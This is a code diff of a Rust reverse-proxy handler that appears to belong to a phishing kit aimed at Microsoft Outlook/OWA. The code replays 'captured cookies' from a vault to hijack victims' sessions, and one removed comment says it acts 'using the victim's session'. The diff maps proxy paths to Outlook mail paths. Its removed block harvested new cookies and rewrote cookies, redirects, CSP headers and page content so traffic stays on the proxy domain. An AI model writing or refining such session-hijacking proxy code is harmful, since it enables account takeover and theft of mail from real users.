@@ -134,9 +134,6 @@ pub async fn proxy_handler(
         .build()
         .unwrap_or_default();
     
-    // Build target URL
-    let target_url = format!("{}{}", config.target_url, req.uri().path_and_query().map(|p| p.as_str()).unwrap_or("/"));
-    
     // Extract token_id from path if present (e.g., /s/{token_id}/...)
     let path = req.uri().path();
     let token_id = if path.starts_with("/s/") {
@@ -150,10 +147,24 @@ pub async fn proxy_handler(
         None
     };
     
-    // Handle session path: /s/{token_id}/
-    // Set captured cookies and act as a proxy using the victim's session
+    // Map proxy paths to real Microsoft paths
+    let microsoft_path = if path.starts_with("/s/") {
+        // Session paths map to Outlook mail
+        "/mail/"
+    } else if path == "/" || path == "/owa/" {
+        "/owa/"
+    } else {
+        path
+    };
+    
+    // Build target URL
+    let target_url = format!("https://{}{}", config.target_domain, microsoft_path);
+    
+    // Build proxy headers with captured cookies
+    let mut headers = build_proxy_headers(&req, config);
+    
+    // If token_id is present, add captured cookies
     if let Some(ref tid) = token_id {
-        // Get cookies for this token
         let cookie_capture = CookieCapture::new(state.vault.clone());
         let cookies = match cookie_capture.get_cookies(&state.pool, tid).await {
             Ok(cookies) => cookies,
@@ -163,10 +174,6 @@ pub async fn proxy_handler(
             }
         };
         
-        // Build proxy headers with captured cookies
-        let mut headers = build_proxy_headers(&req, config);
-        
-        // Add captured cookies as Cookie header
         if !cookies.is_empty() {
             let cookie_str = cookies
                 .iter()
@@ -180,122 +187,6 @@ pub async fn proxy_handler(
                 }),
             );
         }
-        
-        // Create request builder
-        let mut request_builder = client.request(
-            reqwest::Method::from_bytes(req.method().as_str().as_bytes()).unwrap_or(reqwest::Method::GET),
-            &target_url,
-        );
-        
-        request_builder = request_builder.headers(headers);
-        
-        if !body.is_empty() {
-            request_builder = request_builder.body(body.to_vec());
-        }
-        
-        let response = match request_builder.send().await {
-            Ok(resp) => resp,
-            Err(e) => {
-                eprintln!("[proxy] Request failed: {}", e);
-                return HttpResponse::BadGateway().body(format!("Proxy error: {}", e));
-            }
-        };
-        
-        let status = response.status();
-        let response_headers = response.headers().clone();
-        
-        // Capture new cookies from response
-        if let Err(e) = cookie_capture.capture_from_response(&state.pool, tid, &response_headers).await {
-            eprintln!("[proxy] Failed to capture cookies: {}", e);
-        }
-        
-        // Build response
-        let mut resp = HttpResponse::build(
-            actix_web::http::StatusCode::from_u16(status.as_u16()).unwrap_or(actix_web::http::StatusCode::OK)
-        );
-        
-        // Copy and rewrite headers
-        for (name, value) in response_headers.iter() {
-            let name_str = name.as_str().to_lowercase();
-            
-            if name_str == "set-cookie" {
-                let cookie_value = value.to_str().unwrap_or("");
-                let rewritten_cookie = rewrite_cookie_domain(cookie_value, config);
-                if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_cookie) {
-                    resp.append_header((name.clone(), header_value));
-                }
-                continue;
-            }
-            
-            if name_str == "location" {
-                let location = value.to_str().unwrap_or("");
-                let rewritten_location = rewrite_url_to_proxy(location, config);
-                if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_location) {
-                    resp.append_header((name.clone(), header_value));
-                }
-                continue;
-            }
-            
-            if name_str == "content-security-policy" {
-                let csp = value.to_str().unwrap_or("");
-                let rewritten_csp = csp.replace(&config.target_domain, &config.proxy_domain);
-                if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_csp) {
-                    resp.append_header((name.clone(), header_value));
-                }
-                continue;
-            }
-            
-            if name_str == "content-encoding" || name_str == "transfer-encoding" {
-                continue;
-            }
-            
-            if let Ok(header_value) = header::HeaderValue::from_bytes(value.as_bytes()) {
-                resp.append_header((name.clone(), header_value));
-            }
-        }
-        
-        // Get response body
-        let body_bytes = match response.bytes().await {
-            Ok(bytes) => bytes,
-            Err(e) => {
-                eprintln!("[proxy] Failed to read response body: {}", e);
-                return HttpResponse::BadGateway().body("Failed to read response body");
-            }
-        };
-        
-        let content_type = response_headers.get("content-type")
-            .and_then(|v| v.to_str().ok())
-            .unwrap_or("");
-        
-        let body_text = String::from_utf8(body_bytes.to_vec());
-        
-        let body_content: String;
-        let body_size: usize;
-        
-        if body_text.is_ok() && (content_type.contains("text/html") || content_type.contains("application/xhtml")) {
-            let html = body_text.unwrap();
-            body_content = rewrite_html_content(&html, config);
-            body_size = body_content.len();
-        } else if body_text.is_ok() && (content_type.contains("javascript") || content_type.contains("json")) {
-            let js = body_text.unwrap();
-            body_content = rewrite_js_content(&js, config);
-            body_size = body_content.len();
-        } else if body_text.is_ok() && content_type.contains("css") {
-            let css = body_text.unwrap();
-            body_content = rewrite_css_content(&css, config);
-            body_size = body_content.len();
-        } else if body_text.is_ok() && content_type.contains("text") {
-            body_content = body_text.unwrap();
-            body_size = body_content.len();
-        } else {
-            body_content = String::from_utf8_lossy(&body_bytes).to_string();
-            body_size = body_content.len();
-        };
-        
-        let mut response = resp.body(body_content);
-        crate::proxy_security::add_security_headers(&mut response);
-        log_request(&req, Some(tid), status.as_u16(), body_size);
-        return response;
     }
     
     // Security: Check rate limit
@@ -326,9 +217,6 @@ pub async fn proxy_handler(
     }
     
     println!("[proxy] {} {} → {} (token_id: {:?})", req.method(), req.uri(), target_url, token_id);
-    
-    // Build proxy headers
-    let headers = build_proxy_headers(&req, config);
     
     // Create request builder
     let mut request_builder = client.request(
